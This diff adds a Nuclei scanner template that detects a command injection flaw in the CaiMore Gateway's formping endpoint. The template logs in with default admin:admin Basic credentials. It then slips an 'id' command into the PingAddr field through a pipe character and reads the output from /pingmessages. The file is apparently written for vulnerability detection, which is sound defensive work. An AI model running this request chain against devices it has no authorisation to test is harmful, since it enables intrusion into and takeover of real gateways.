@@ -1,0 +1,61 @@
+id: caimore-gateway-command-execution
+info:
+  name: CaiMore Gateway formping Command Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The CaiMore Gateway contains a command execution vulnerability in the formping file. An attacker can exploit this to execute arbitrary code on the server side, write backdoors, and gain full control of the web server.
+  reference:
+    - https://fofa.info
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Authorization: Basic YWRtaW46YWRtaW4=
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "厦门才茂通信科技有限公司"
+          - "用户管理"
+          - "系统工具"
+  - raw:
+      - |
+        POST /goform/formping HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Authorization: Basic YWRtaW46YWRtaW4=
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+
+        PingAddr=www.baidu.com%7Cid&PingPackNumb=1&PingMsg=
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "window.parent.ialert(\"Tip\",\"Start\",\"#00CC00\")"
+          - "location.href=document.referrer"
+  - raw:
+      - |
+        GET /pingmessages?_=1668501225893 HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Basic YWRtaW46YWRtaW4=
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - "uid=(.*?)"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
